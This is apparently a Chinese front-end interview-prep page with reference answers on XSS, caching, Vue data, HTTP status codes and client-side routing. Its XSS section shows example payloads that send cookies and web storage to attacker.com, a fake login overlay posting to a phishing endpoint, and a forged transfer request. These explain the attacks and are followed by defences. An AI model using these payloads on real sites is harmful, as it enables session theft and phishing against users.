**1. 反射型XSS（Reflected XSS）**：
恶意脚本通过URL参数或表单提交等方式传递给服务器，服务器将恶意脚本直接反射回浏览器执行。

```javascript
// 漏洞示例：搜索功能
// URL: https://example.com/search?q=<script>alert('XSS')</script>

// 服务器端代码（存在漏洞）
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h1>搜索结果：${query}</h1>`); // 直接输出用户输入
});

// 攻击者构造恶意链接
https://example.com/search?q=<script>
  document.location='http://attacker.com/steal?cookie='+document.cookie
</script>
```

**2. 存储型XSS（Stored XSS）**：
恶意脚本被存储在服务器端（如数据库、文件等），当其他用户访问相关页面时，恶意脚本从服务器取出并执行。

```javascript
// 漏洞示例：评论功能
// 攻击者提交恶意评论
const maliciousComment = `
  很好的文章！
  <script>
    // 窃取其他用户的Cookie
    fetch('http://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify({
        cookie: document.cookie,
        url: location.href
      })
    });
  </script>
`;

// 服务器存储评论（存在漏洞）
db.comments.insert({
  content: maliciousComment, // 直接存储未过滤的内容
  user: userId,
  timestamp: new Date()
});

// 其他用户访问时执行恶意脚本
app.get('/comments', (req, res) => {
  const comments = db.comments.find();
  let html = '<div>';
  comments.forEach(comment => {
    html += `<p>${comment.content}</p>`; // 直接输出，导致脚本执行
  });
  html += '</div>';
  res.send(html);
});
```

**3. DOM型XSS（DOM-based XSS）**：
恶意脚本通过修改页面的DOM环境来执行，整个攻击过程在客户端完成，不经过服务器。

```javascript
// 漏洞示例：客户端路由
// URL: https://example.com/#<script>alert('XSS')</script>

// 存在漏洞的前端代码
function displayContent() {
  const hash = location.hash.substring(1); // 获取URL片段
  document.getElementById('content').innerHTML = hash; // 直接插入DOM
}

window.onload = displayContent;

// 攻击者构造恶意URL
https://example.com/#<img src=x onerror="
  fetch('http://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      localStorage: JSON.stringify(localStorage),
      sessionStorage: JSON.stringify(sessionStorage)
    })
  })
">
```

**XSS攻击的危害：**

**窃取敏感信息**：

```javascript
// 窃取Cookie
document.location = 'http://attacker.com/steal?cookie=' + document.cookie;

// 窃取本地存储
const sensitiveData = {
  localStorage: JSON.stringify(localStorage),
  sessionStorage: JSON.stringify(sessionStorage),
  cookies: document.cookie
};
```

**会话劫持**：
攻击者获取用户的会话标识，冒充用户身份进行操作。

**钓鱼攻击**：

```javascript
// 创建虚假登录表单
document.body.innerHTML = `
  <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;">
    <h2>会话已过期，请重新登录</h2>
    <form action="http://attacker.com/phishing" method="post">
      <input type="text" name="username" placeholder="用户名" required>
      <input type="password" name="password" placeholder="密码" required>
      <button type="submit">登录</button>
    </form>
  </div>
`;
```

**恶意操作**：

```javascript
// 自动发送恶意请求
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest'
  },
  body: JSON.stringify({
    to: 'attacker_account',
    amount: 1000
  })
});
```

**XSS攻击的检测方法：**

```javascript
// 简单的XSS检测函数
function detectXSS(input) {
  const xssPatterns = [
    /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
    /javascript:/gi,
    /on\w+\s*=/gi,
    /<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/gi
  ];

  return xssPatterns.some(pattern => pattern.test(input));
}
```

</details>

## 14. 如何规避XSS攻击？请列举至少三种方法 {#question-subjective-880b2a30ece9}

### 题目要点

- 输入防护：验证过滤、白名单机制
- 输出安全：HTML转义、模板引擎自动转义
- 策略防护：CSP策略、HttpOnly Cookie
- 前端安全：安全DOM操作、URL验证
- 持续监控：自动化检测、安全审计

<details>
<summary>参考答案</summary>

防御XSS攻击需要从多个层面进行综合防护，以下是几种主要的防御方法：

**1. 输入验证和过滤**

**服务器端输入验证**：

```javascript
// 输入验证示例
function validateInput(input, type) {
  switch(type) {
    case 'email':
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      return emailRegex.test(input);

    case 'username':
      // 只允许字母、数字、下划线
      const usernameRegex = /^[a-zA-Z0-9_]{3,20}$/;
      return usernameRegex.test(input);

    case 'text':
      // 检查是否包含危险字符
      const dangerousPatterns = [
        /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
        /javascript:/gi,
        /on\w+\s*=/gi
      ];
      return !dangerousPatterns.some(pattern => pattern.test(input));
  }
}

// Express.js中间件示例
app.use((req, res, next) => {
  // 验证所有输入参数
  for (let key in req.body) {
    if (typeof req.body[key] === 'string') {
      if (!validateInput(req.body[key], 'text')) {
        return res.status(400).json({ error: '输入包含非法字符' });
      }
    }
  }
  next();
});
```

**白名单过滤**：

```javascript
// 使用DOMPurify进行HTML净化
import DOMPurify from 'dompurify';

function sanitizeHTML(dirty) {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
    ALLOWED_ATTR: []
  });
}

// 使用示例
const userInput = '<p>正常内容</p><script>alert("XSS")</script>';
const cleanHTML = sanitizeHTML(userInput); // 只保留<p>标签
```

**2. 输出编码（HTML转义）**

**HTML实体编码**：

```javascript
// HTML转义函数
function escapeHTML(str) {
  const htmlEscapes = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;'
  };

  return str.replace(/[&<>"'\/]/g, (match) => htmlEscapes[match]);
}

// 使用示例
const userInput = '<script>alert("XSS")</script>';
const safeOutput = escapeHTML(userInput);
// 输出: &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;

// 在模板中使用
app.get('/profile', (req, res) => {
  const username = escapeHTML(req.user.username);
  res.send(`<h1>欢迎, ${username}!</h1>`);
});
```

**模板引擎自动转义**：

```javascript
// 使用Handlebars的自动转义
// 模板文件
`<h1>用户名: {{username}}</h1>` // 自动转义
`<div>{{{content}}}</div>`      // 不转义（危险）

// Vue.js中的安全实践
<template>
  <!-- 自动转义 -->
  <div>{{ userInput }}</div>

  <!-- 危险：不要使用v-html显示用户输入 -->
  <div v-html="userInput"></div> <!-- 避免这样做 -->

  <!-- 安全的v-html使用 -->
  <div v-html="sanitizedContent"></div>
</template>

<script>
import DOMPurify from 'dompurify';

export default {
  computed: {
    sanitizedContent() {
      return DOMPurify.sanitize(this.userInput);
    }
  }
}
</script>
```

**3. Content Security Policy (CSP)**

**CSP头部配置**：

```javascript
// Express.js中设置CSP
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self' 'unsafe-inline' https://trusted-cdn.com; " +
    "style-src 'self' 'unsafe-inline'; " +
    "img-src 'self' data: https:; " +
    "connect-src 'self' https://api.example.com; " +
    "font-src 'self' https://fonts.googleapis.com; " +
    "object-src 'none'; " +
    "base-uri 'self'; " +
    "form-action 'self';"
  );
  next();
});
```

**Nonce和Hash策略**：

```javascript
// 生成随机nonce
const crypto = require('crypto');

app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  res.setHeader('Content-Security-Policy',
    `script-src 'self' 'nonce-${res.locals.nonce}'`
  );
  next();
});

// 在HTML中使用nonce
`<script nonce="${nonce}">
  // 只有带有正确nonce的脚本才能执行
  console.log('This script is allowed');
</script>`
```

**4. HttpOnly Cookie**

```javascript
// 设置HttpOnly Cookie
app.use(session({
  secret: 'your-secret-key',
  cookie: {
    httpOnly: true,    // 防止JavaScript访问
    secure: true,      // 只在HTTPS下传输
    sameSite: 'strict' // 防止CSRF攻击
  }
}));

// 手动设置Cookie
res.cookie('sessionId', sessionId, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'strict',
  maxAge: 24 * 60 * 60 * 1000 // 24小时
});
```

**5. 前端防护措施**

**DOM操作安全**：

```javascript
// 安全的DOM操作
function safeSetContent(element, content) {
  // 使用textContent而不是innerHTML
  element.textContent = content;
}

// 或者使用安全的HTML插入
function safeSetHTML(element, html) {
  element.innerHTML = DOMPurify.sanitize(html);
}

// 避免危险的DOM操作
// 危险
element.innerHTML = userInput;
document.write(userInput);
eval(userInput);

// 安全
element.textContent = userInput;
element.setAttribute('data-value', userInput);
```

**URL验证**：

```javascript
// 验证URL安全性
function isValidURL(url) {
  try {
    const urlObj = new URL(url);
    // 只允许http和https协议
    return ['http:', 'https:'].includes(urlObj.protocol);
  } catch {
    return false;
  }
}

// 安全的链接处理
function createSafeLink(url, text) {
  if (!isValidURL(url)) {
    return document.createTextNode(text);
  }

  const link = document.createElement('a');
  link.href = url;
  link.textContent = text;
  link.rel = 'noopener noreferrer'; // 防止window.opener攻击
  return link;
}
```

**6. 定期安全审计**

```javascript
// 自动化XSS检测
const xssDetector = {
  patterns: [
    /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
    /javascript:/gi,
    /on\w+\s*=/gi,
    /<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/gi,
    /data:text\/html/gi
  ],

  scan(content) {
    return this.patterns.some(pattern => pattern.test(content));
  },

  report(content, source) {
    if (this.scan(content)) {
      console.warn(`Potential XSS detected in ${source}:`, content);
      // 发送到安全监控系统
      this.sendAlert(content, source);
    }
  }
};
```

</details>

## 15. 假设你管理一个论坛，用户在评论中注入了脚本。你会如何防止这种攻击？ {#question-subjective-404354bb0721}

### 题目要点

- **输入验证与净化：** 对用户提交内容进行严格过滤和转义，移除或编码潜在恶意代码。
- **输出编码/转义：** 根据内容在HTML、JS等不同上下文中的位置，进行相应的编码处理。
- **内容安全策略（CSP）：** 通过白名单机制限制可执行脚本的来源，从浏览器层面阻止非授权脚本运行。
- **HttpOnly Cookie：** 保护会话Cookie不被客户端脚本访问。

<details>
<summary>参考答案</summary>

这种攻击通常指的是跨站脚本（XSS）攻击。作为论坛管理者，防止这类攻击是保障用户安全和系统稳定的核心任务。

首先，最关键的防御措施是**输入验证和净化**。当用户提交评论内容时，不能直接信任任何输入。我们需要对所有用户输入进行严格的验证，确保其符合预期的格式和内容。更重要的是，要对可能包含恶意代码的字符进行净化处理。这意味着将HTML标签（如`&lt;script&gt;`、`&lt;iframe&gt;`）、事件属性（如`onerror`、`onload`）以及其他可能执行脚本的特殊字符进行转义或移除。例如，将`<`转换为`&lt;`，将`>`转换为`&gt;`。这可以通过后端或前端的库来实现，但通常后端净化是更可靠的防线。

其次，**输出编码/转义**也至关重要。即使输入阶段进行了净化，在将用户生成的内容渲染到页面上时，也必须根据其所在的上下文进行适当的编码。例如，如果内容要作为HTML文本显示，就进行HTML实体编码；如果作为JavaScript字符串显示，就进行JavaScript字符串编码。这能确保浏览器将这些内容视为纯文本而非可执行代码。

再者，我会实施**内容安全策略（CSP）**。CSP是一种强大的安全机制，通过HTTP响应头或HTML的`&lt;meta&gt;`标签来定义。它允许开发者指定浏览器可以从哪些源加载和执行脚本、样式、图片等资源。通过严格的CSP策略，可以有效地限制恶意脚本的执行，即使它们成功注入到页面中，也可能因为不符合CSP规则而被浏览器阻止运行。例如，可以设置只允许加载同源脚本，或者只允许加载特定哈希值的脚本。

最后，对于会话管理，我会确保敏感的Cookie设置了`HttpOnly`属性，这样JavaScript就无法通过`document.cookie`访问到这些Cookie，从而降低XSS攻击窃取用户会话的风险。

</details>

## 16. 浏览器缓存有哪些类型？它们各自的作用是什么？ {#question-subjective-9a85abd2ba41}

### 题目要点

- **强缓存：** 浏览器直接从本地读取，不发请求，速度最快，由`Cache-Control`和`Expires`控制。
- **协商缓存：** 浏览器发请求到服务器验证，若未变则返回304，从本地读取，由`Last-Modified`/`If-Modified-Since`和`ETag`/`If-None-Match`控制，保证新鲜度。
- **其他：** 内存缓存（快，短生命周期）、磁盘缓存（慢，长生命周期）、Service Worker Cache（更灵活，支持离线）。

<details>
<summary>参考答案</summary>

浏览器缓存主要分为两大类：强缓存和协商缓存。它们共同协作，旨在减少网络请求，提升网页加载速度和用户体验。

**1. 强缓存（Strong Cache）**

- **作用机制：** 当浏览器请求一个资源时，如果该资源命中强缓存，浏览器会直接从本地缓存中读取资源，而不会向服务器发送任何请求。这是最快的缓存方式，因为它完全避免了网络延迟。
- **控制方式：** 主要通过HTTP响应头中的`Cache-Control`和`Expires`字段来控制。

- `Cache-Control`：这是HTTP/1.1引入的，更灵活和强大。常见的指令有：

- `max-age=<seconds>`：指定资源在缓存中保持新鲜的最长时间（秒）。
- `no-cache`：表示客户端缓存资源，但每次使用前必须向服务器进行协商验证（即转为协商缓存）。
- `no-store`：表示禁止缓存，每次请求都必须从服务器获取完整响应。
- `public`：表示资源可以被任何缓存（包括代理服务器）缓存。
- `private`：表示资源只能被用户浏览器缓存，不能被共享缓存（如代理服务器）缓存。

- `Expires`：这是HTTP/1.0引入的，指定一个绝对的过期时间。如果当前时间超过这个时间，缓存就失效。它的优先级低于`Cache-Control`的`max-age`。

- **作用：** 极大提升页面加载速度，减少服务器压力和网络带宽消耗。

**2. 协商缓存（Negotiation Cache）**

- **作用机制：** 当强缓存失效后，浏览器会向服务器发送一个请求，但这个请求会带上一些特殊的标识（如资源的最后修改时间或唯一标识符），服务器根据这些标识来判断资源是否发生了变化。如果资源未发生变化，服务器会返回一个`304 Not Modified`状态码，浏览器则从本地缓存中读取资源；如果资源已发生变化，服务器会返回新的资源和`200 OK`状态码。
- **控制方式：** 主要通过HTTP响应头中的`Last-Modified`/`If-Modified-Since`和`ETag`/`If-None-Match`字段来控制。

- `Last-Modified`（服务器响应）/`If-Modified-Since`（浏览器请求）：服务器在响应头中告知资源的最后修改时间。浏览器在后续请求时，会将这个时间通过`If-Modified-Since`发送给服务器。
- `ETag`（服务器响应）/`If-None-Match`（浏览器请求）：`ETag`是服务器为资源生成的唯一标识符（通常是内容的哈希值）。浏览器在后续请求时，会将这个`ETag`通过`If-None-Match`发送给服务器。`ETag`的优先级高于`Last-Modified`，因为它能更精确地判断资源是否变化（例如，内容未变但修改时间变了）。

- **作用：** 在保证资源新鲜度的前提下，尽可能地利用缓存，减少数据传输量，避免不必要的完整资源下载。

除了这两大类，还有一些与缓存相关的概念：

- **Memory Cache（内存缓存）：** 存储在内存中的缓存，生命周期短，通常只在当前会话有效，页面关闭后即失效。访问速度最快。
- **Disk Cache（磁盘缓存）：** 存储在磁盘上的缓存，生命周期长，即使浏览器关闭后也可能保留。访问速度相对较慢，但可以跨会话使用。
- **Service Worker Cache（服务工作线程缓存）：** 是一种更高级、更灵活的缓存机制，通过JavaScript编写的服务工作线程来拦截网络请求并控制缓存。它允许开发者实现离线访问、自定义缓存策略等复杂功能。

</details>

## 17. 强缓存何时会更新？如何控制强缓存的更新？ {#question-subjective-578195383a73}

### 题目要点

**更新时机：** 缓存过期、用户强制刷新或清除缓存。
**控制方式：**

- **`Cache-Control`：** 通过`max-age`设置有效期，`no-store`禁止缓存，`no-cache`强制协商。
- **`Expires`：** 设置绝对过期时间（优先级低于`Cache-Control`）。

**版本更新最佳实践：** 采用文件指纹（哈希值）命名静态资源，通过改变文件名来强制浏览器下载新版本。

<details>
<summary>参考答案</summary>

强缓存的更新主要发生在以下几种情况：

1. **缓存过期：** 当`Cache-Control`头中的`max-age`指令指定的时间到达，或者`Expires`头指定的绝对时间已过，浏览器会认为缓存的资源已过期，不再使用强缓存，而是转为协商缓存或直接重新请求。
2. **用户行为：**

1. **强制刷新（Hard Refresh）：** 用户按下 `Ctrl + F5` (Windows) 或 `Cmd + Shift + R` (Mac) 时，浏览器会跳过所有缓存，直接向服务器请求最新资源。
2. **清除浏览器缓存：** 用户在浏览器设置中手动清除缓存数据。

3. **浏览器启发式缓存：** 在某些情况下，如果服务器没有明确设置`Cache-Control`或`Expires`，浏览器可能会根据一些启发式算法（如资源的最后修改时间）来决定是否缓存以及缓存多久。但这通常不推荐依赖。

**如何控制强缓存的更新：**

控制强缓存的更新，主要是通过服务器端设置HTTP响应头来实现。

1. **使用 `Cache-Control` 头部：**

1. **设置缓存有效期：** 最常用的是 `Cache-Control: max-age=<seconds>`。通过设置一个合适的秒数，可以控制资源在客户端缓存多长时间。例如，对于不经常变动的静态资源（如图片、字体），可以设置较长的`max-age`（如一年），以最大化缓存效益。
2. **强制不缓存：** `Cache-Control: no-store` 可以确保资源不被任何缓存存储，每次都从服务器获取最新内容。这适用于敏感或实时性要求极高的内容。
3. **强制协商缓存：** `Cache-Control: no-cache` 意味着资源会被缓存，但每次使用前都必须向服务器进行验证（即转为协商缓存），以确保获取的是最新版本。这适用于需要一定新鲜度但又希望利用缓存减少传输量的场景。

2. **使用 `Expires` 头部（HTTP/1.0 兼容）：**

1. `Expires: <GMT date/time>`：设置一个具体的GMT格式的日期和时间，表示资源在该时间之后过期。虽然不如`Cache-Control`灵活，但为了兼容老旧的HTTP/1.0客户端或代理，有时仍会同时设置。

**对于发布新版本时强制更新强缓存，最有效和推荐的方法是：**

- **文件指纹（File Fingerprinting）/版本号（Versioning）/哈希值（Hashing）：**

- 这是现代前端构建工具（如Webpack, Rollup, Vite）普遍采用的策略。
- **原理：** 在构建过程中，根据静态文件的内容生成一个唯一的哈希值，并将其作为文件名的一部分（例如，`bundle.js` 变为 `bundle.f7e3a.js`）。
- **控制更新：** 当文件内容发生变化时，其哈希值也会随之改变，从而生成一个新的文件名。浏览器会将其视为一个全新的资源，即使旧版本的文件仍在缓存中，也会强制下载新文件，从而绕过强缓存。
- **优点：** 这种方法可以为静态资源设置非常长的强缓存时间（例如一年），因为只要文件内容不变，文件名就不会变，可以一直使用缓存；一旦文件内容更新，文件名就会变，用户自然会下载新文件。这实现了缓存的最大化利用和更新的精确控制。

</details>

## 18. 如果代码中包含静态 JS 文件，如何确保用户在发布新版本（如从 1.0 到 2.0）时获取到最新的文件？ {#question-subjective-9f52c680a01a}

### 题目要点

- **核心策略：** 文件指纹（File Fingerprinting）。
- **原理：** 根据文件内容生成哈希值，并将其作为文件名的一部分。
- **工作方式：** 文件内容变化 -> 哈希值变化 -> 文件名变化 -> 浏览器视为新资源 -> 强制下载。
- **优点：** 最大化缓存利用，同时确保更新即时生效。
- **实现工具：** 现代前端构建工具（Webpack, Rollup, Vite）内置支持。

<details>
<summary>参考答案</summary>

确保用户在发布新版本时获取到最新的静态 JS 文件，核心在于**让浏览器认为这是一个全新的资源，从而绕过其本地缓存**。最可靠和广泛采用的策略是**文件指纹（File Fingerprinting）**。

**原理：**
文件指纹是指在构建或打包静态资源时，根据文件的内容生成一个唯一的哈希值（例如MD5、SHA256），并将其作为文件名的一部分或者作为查询参数附加到文件名后面。

**具体实现方式：**

1. **哈希值作为文件名的一部分（推荐）：**

1. 例如，`main.js` 在构建后可能变成 `main.f7e3a.js`。
2. 当 `main.js` 的内容发生任何变化时，生成的哈希值也会不同，从而得到一个新的文件名，比如 `main.xyz12.js`。
3. 在HTML文件中引用这个JS文件时，会引用新的文件名。
4. **工作流程：**

1. **版本 1.0：** 部署 `main.f7e3a.js`。服务器为它设置一个很长的强缓存时间（例如 `Cache-Control: max-age=31536000`，一年）。用户访问时，浏览器下载并缓存 `main.f7e3a.js`。
2. **版本 2.0：** `main.js` 内容更新，构建工具生成新的哈希值，得到 `main.xyz12.js`。部署新文件，并更新HTML中对JS文件的引用为 `main.xyz12.js`。
3. 用户再次访问时，浏览器发现HTML中引用的文件名是 `main.xyz12.js`，而本地缓存中只有 `main.f7e3a.js`。由于文件名不同，浏览器会将其视为一个全新的资源，强制从服务器下载 `main.xyz12.js`，从而获取到最新版本。

5. **优点：** 这种方式最彻底，可以为静态资源设置极长的缓存时间，最大化利用缓存，同时确保内容更新时能立即生效。现代前端构建工具（如Webpack, Rollup, Vite）都内置了这种能力。

2. **哈希值作为查询参数（次选）：**

1. 例如，`main.js?v=f7e3a`。
2. 当文件内容更新时，查询参数会改变，例如 `main.js?v=xyz12`。
3. **优点：** 实现相对简单。
4. **缺点：** 某些代理服务器或CDN可能会忽略URL中的查询参数进行缓存，导致更新不及时。因此，不如直接改变文件名可靠。

**不推荐但有时会提及的方法：**

- **`Cache-Control: no-cache` 或 `max-age=0`：**

- 这会强制浏览器每次都向服务器发送请求进行协商验证。虽然能确保获取最新，但每次请求都会有网络开销（即使返回304），不如文件指纹那样能完全避免请求。适用于对实时性要求高，但又希望利用协商缓存减少传输量的场景。

**总结：**
文件指纹是确保用户获取最新静态JS文件的黄金标准。通过在文件名中嵌入内容哈希值，可以实现对静态资源缓存的精确控制，既能充分利用浏览器缓存提升性能，又能保证在发布新版本时用户能立即获取到更新。

</details>

## 19. 为什么 Vue 2 中的 data 必须是一个函数？ {#question-subjective-899e9125c1d9}

### 题目要点

- **目的：** 确保每个组件实例拥有独立的数据副本。
- **问题：** 若`data`为对象，所有组件实例将共享同一数据引用。
- **后果：** 一个实例的数据改变会影响所有其他实例。
- **解决方案：** `data`作为函数，每次创建实例时调用，返回全新数据对象。
- **结果：** 实现组件数据隔离，保证可复用性。

<details>
<summary>参考答案</summary>

在 Vue 2 中，当您定义一个组件时，其 `data` 选项必须是一个函数，而不是一个纯粹的对象。这个要求是针对**组件**而言的，对于根 Vue 实例（例如 `new Vue({ data: { ... } })`），`data` 可以是一个对象。

**原因在于：**

如果 `data` 选项是一个纯粹的对象，并且这个组件被多次复用（即创建了多个组件实例），那么所有这些组件实例将**共享同一个 `data` 对象引用**。

**举例说明：**

假设我们有一个计数器组件：

```javascript
// 错误示例，如果 data 是一个对象
const CounterComponent = {
  template: '<div>{{ count }} <button @click="count++">Increment</button></div>',
  data: {
    count: 0 // 这是一个共享的对象
  }
};

// 如果这样创建两个实例
new Vue({ el: '#app1', components: { CounterComponent }, template: '<counter-component></counter-component>' });
new Vue({ el: '#app2', components: { CounterComponent }, template: '<counter-component></counter-component>' });
```

在这种情况下，`#app1` 和 `#app2` 中的 `CounterComponent` 实例，它们内部的 `count` 属性实际上都指向了同一个 `data` 对象中的 `count`。这意味着，当您点击 `#app1` 中的按钮，`count` 增加时，`#app2` 中的 `count` 也会跟着增加，因为它们操作的是同一个内存地址上的数据。这显然不是我们期望的组件独立性。

**解决方案（`data` 作为函数）：**

当 `data` 是一个函数时，Vue 在创建**每一个组件实例**的时候，都会调用这个 `data` 函数。每次调用都会返回一个**全新的、独立的 `data` 对象**。

```javascript
// 正确示例，data 是一个函数
const CounterComponent = {
  template: '<div>{{ count }} <button @click="count++">Increment</button></div>',
  data() { // 这是一个函数
    return {
      count: 0 // 每次调用都会返回一个新的对象
    };
  }
};

// 这样创建的两个实例
new Vue({ el: '#app1', components: { CounterComponent }, template: '<counter-component></counter-component>' });
new Vue({ el: '#app2', components: { CounterComponent }, template: '<counter-component></counter-component>' });
```

现在，`#app1` 和 `#app2` 中的 `CounterComponent` 实例各自拥有一个独立的 `data` 对象。它们之间的 `count` 属性互不影响，实现了组件的**数据隔离和复用性**。

**总结：**

Vue 2 中组件的 `data` 必须是一个函数，是为了确保每个组件实例都拥有自己独立的数据副本，避免多个实例之间共享同一个数据对象而导致的交叉污染和不可预测的行为。这保证了组件的封装性和可复用性。

</details>

## 20. 讲一下 HTTP 状态码 200、304、404 和 500 的含义。 {#question-subjective-98e4a38bb46e}

### 题目要点

- **200 OK：** 请求成功，资源已返回或操作已完成。
- **304 Not Modified：** 资源未修改，客户端可使用本地缓存。
- **404 Not Found：** 服务器找不到请求的资源。
- **500 Internal Server Error：** 服务器内部发生错误，无法完成请求。

<details>
<summary>参考答案</summary>

HTTP 状态码是服务器对客户端请求的响应结果，它们是三位数字，用于指示特定 HTTP 请求是否已成功完成。

1. **200 OK**

1. **含义：** 表示请求已成功，服务器已成功处理了请求。对于 GET 请求，这意味着资源已成功获取并在响应体中返回。对于 POST、PUT、DELETE 等请求，它表示操作已成功完成。
2. **常见场景：** 网页加载成功、API 请求成功返回数据。
3. **举例：** 浏览器请求一个HTML页面，服务器成功返回页面内容。

2. **304 Not Modified**

1. **含义：** 表示客户端发出了一个条件请求（通常是带有 `If-Modified-Since` 或 `If-None-Match` 头的 GET 请求），服务器判断资源自上次请求以来没有被修改过。
2. **常见场景：** 浏览器利用协商缓存机制，向服务器验证本地缓存的资源是否仍然有效。服务器返回 304，告诉浏览器可以直接使用本地缓存的资源，无需重新下载。这大大节省了网络带宽和加载时间。
3. **举例：** 浏览器再次访问一个图片，带上上次获取到的 `ETag`，服务器发现图片未变，返回 304。

3. **404 Not Found**

1. **含义：** 表示服务器无法找到请求的资源。这意味着客户端的请求语法是正确的，但服务器上不存在与请求 URL 匹配的资源。
2. **常见场景：** 用户访问了一个不存在的页面、链接失效、API 接口路径错误。
3. **举例：** 用户输入了一个错误的网址，或者点击了一个已删除的页面链接。

4. **500 Internal Server Error**

1. **含义：** 表示服务器在执行请求时遇到了一个意外的错误，导致无法完成请求。这是一个通用的服务器端错误，通常意味着服务器代码或配置出现了问题，而不是客户端请求本身的问题。
2. **常见场景：** 后端代码逻辑错误、数据库连接失败、服务器配置问题、第三方服务调用失败等。
3. **举例：** 用户提交表单，但后端处理逻辑中出现未捕获的异常，导致服务器返回 500 错误。

</details>

## 21. 如何实现一个简单的前端路由系统？请简述其原理。 {#question-subjective-b2e9b9ff6e80}

### 题目要点

**核心目标：** 不刷新页面，根据 URL 动态更新内容。
**共同原理：** 路由映射表 + 监听 URL 变化 + 动态渲染组件。

**哈希模式：**

- **原理：** 利用 URL 哈希值变化不触发页面刷新。
- **监听：** `hashchange` 事件。
- **优点：** 兼容性好，无需服务器配置。
- **缺点：** URL 带 `#`，SEO 相对弱。

**历史模式：**

- **原理：** 利用 HTML5 History API (`pushState`等) 改变 URL 不刷新。
- **监听：** `popstate` 事件。
- **优点：** URL 美观，SEO 友好。
- **缺点：** 需要服务器配置回退路由。

<details>
<summary>参考答案</summary>

前端路由系统的核心目标是：在不进行整页刷新的情况下，根据 URL 的变化来动态地更新页面内容，从而模拟传统多页应用的导航体验。实现一个简单的前端路由系统主要有两种主流原理：**哈希模式（Hash Mode）** 和 **历史模式（History Mode）**。

**共同原理：**
无论哪种模式，前端路由系统都需要维护一个**路由映射表**，将特定的 URL 路径与对应的组件或视图进行关联。当 URL 发生变化时，路由系统会检测到这种变化，然后根据映射表找到对应的组件，并将其渲染到页面上的指定区域（通常是一个占位符，如 `<router-view>` 或 `<Outlet>`）。

---

**1. 哈希模式（Hash Mode）**

- **原理：** 这种模式利用 URL 中的哈希片段（`#` 后面的部分）来模拟路由。例如：`http://example.com/#/users`。

- **URL 特性：** URL 中 `#` 后面的内容（哈希值）不会被发送到服务器，因此改变哈希值不会触发浏览器向服务器发送新的请求，也就不会导致页面刷新。
- **变化监听：** 浏览器提供了 `hashchange` 事件。当 URL 的哈希值发生变化时，会触发这个事件。

- **实现步骤简述：**

1. **监听 `hashchange` 事件：** 在 JavaScript 中添加事件监听器，当哈希值变化时执行回调函数。
2. **获取哈希值：** 在回调函数中，通过 `window.location.hash` 获取当前的哈希值。
3. **解析与匹配：** 解析哈希值，并与预定义的路由映射表（例如 `{ '/users': UsersComponent, '/products': ProductsComponent }`）进行匹配。
4. **渲染组件：** 根据匹配结果，动态地加载并渲染对应的组件到页面的内容区域。
5. **导航：** 通过修改 `window.location.hash` 来实现页面跳转，例如 `window.location.hash = '/new-path'`。

- **优点：**

- 兼容性好，支持所有现代浏览器和旧版浏览器。
- 无需服务器端配置。

- **缺点：**

- URL 中带有 `#`，不够美观。
- SEO 相对不友好（尽管现代搜索引擎对哈希路由的抓取能力有所提升）。

---

**2. 历史模式（History Mode）**

- **原理：** 这种模式利用 HTML5 History API（`pushState` 和 `replaceState`）来改变 URL，同时不触发页面刷新。

- **URL 特性：** 改变的是 URL 的路径部分（例如：`http://example.com/users`），看起来更像传统的服务器端路由。
- **变化监听：**

- **`popstate` 事件：** 当用户点击浏览器的前进/后退按钮时，会触发 `popstate` 事件。
- **手动调用：** 通过 `history.pushState()` 或 `history.replaceState()` 方法来改变 URL。

- **实现步骤简述：**

1. **监听 `popstate` 事件：** 在 JavaScript 中添加事件监听器，处理用户前进/后退操作。
2. **获取路径：** 在事件回调或手动调用后，通过 `window.location.pathname` 获取当前的 URL 路径。
3. **解析与匹配：** 解析路径，并与预定义的路由映射表进行匹配。
4. **渲染组件：** 根据匹配结果，动态地加载并渲染对应的组件。
5. **导航：** 通过 `history.pushState(state, title, url)` 或 `history.replaceState(state, title, url)` 来改变 URL 并触发页面更新。
6. **服务器端配置：** 这是历史模式的关键。由于改变的是真实 URL 路径，如果用户直接访问 `http://example.com/users` 或刷新页面，浏览器会向服务器发送 `GET /users` 请求。为了避免 404 错误，服务器需要配置一个**回退路由（Fallback Route）**，将所有无法匹配的请求都重定向到应用的 `index.html` 文件。这样，前端路由系统才能接管并正确渲染页面。

- **优点：**

- URL 更美观，没有 `#`。
- 对 SEO 更友好。

- **缺点：**

- 需要服务器端进行额外的配置支持。

**总结：**

简单的前端路由系统通过监听 URL 变化（哈希变化或 History API 变化），然后根据预设的路由规则，动态地加载和渲染对应的组件，从而在不刷新页面的情况下实现视图的切换。哈希模式实现简单但 URL 不够美观，历史模式 URL 美观但需要服务器端支持。

</details>

---

← 已是第一轮 · [返回本次面经]({{< relref "/posts/frontend/interview-experiences/experience-44/_index.md" >}}) · 已是最后一轮 →
